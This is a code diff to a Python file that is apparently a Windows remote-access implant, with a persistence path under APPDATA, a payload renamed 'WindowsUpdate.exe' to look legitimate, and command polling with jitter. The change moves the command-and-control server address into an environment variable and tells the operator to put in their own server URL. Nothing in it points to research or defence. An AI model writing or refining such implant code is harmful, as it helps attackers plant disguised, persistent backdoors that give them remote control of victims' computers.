@@ -10,6 +10,9 @@ import platform
 import random
 import requests
 import winreg
+from dotenv import load_dotenv
+
+load_dotenv()
 import ctypes
 from shutil import copyfile
 
@@ -17,7 +20,7 @@ PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "S
 PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 
 # === CONFIG ===
-C2_DOMAIN = "http://127.0.0.1:443/"
+C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443/")  # Replace with your server URL or set C2_DOMAIN env var
 RETRY_DELAY = 30  # seconds
 POLLING_DELAY = 5  # Check for commands every N seconds
 JITTER = 2  # Random jitter +/- seconds added to polling
